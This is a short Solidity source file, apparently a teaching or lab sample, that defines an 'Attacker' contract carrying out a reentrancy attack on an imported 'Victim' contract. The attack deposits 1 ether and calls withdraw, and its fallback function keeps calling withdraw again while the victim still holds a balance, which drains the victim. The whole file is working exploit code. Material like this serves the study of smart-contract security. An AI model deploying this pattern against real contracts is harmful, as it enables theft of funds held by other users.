// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Victim.sol";
contract Attacker {
   Victim public victim;
   constructor(address _victim) {
        victim = Victim(_victim);
   }
   function attack() public payable{
        require(msg.value >= 1 ether);
        victim.deposit{value:1 ether}();
        victim.withdraw(1 ether);
   }
   function contractBalance() public view returns(uint256){
        return address(this).balance;
   }
   fallback() external payable {
        if(address(victim).balance > msg.value){
             victim.withdraw(1 ether);
        }
   }
}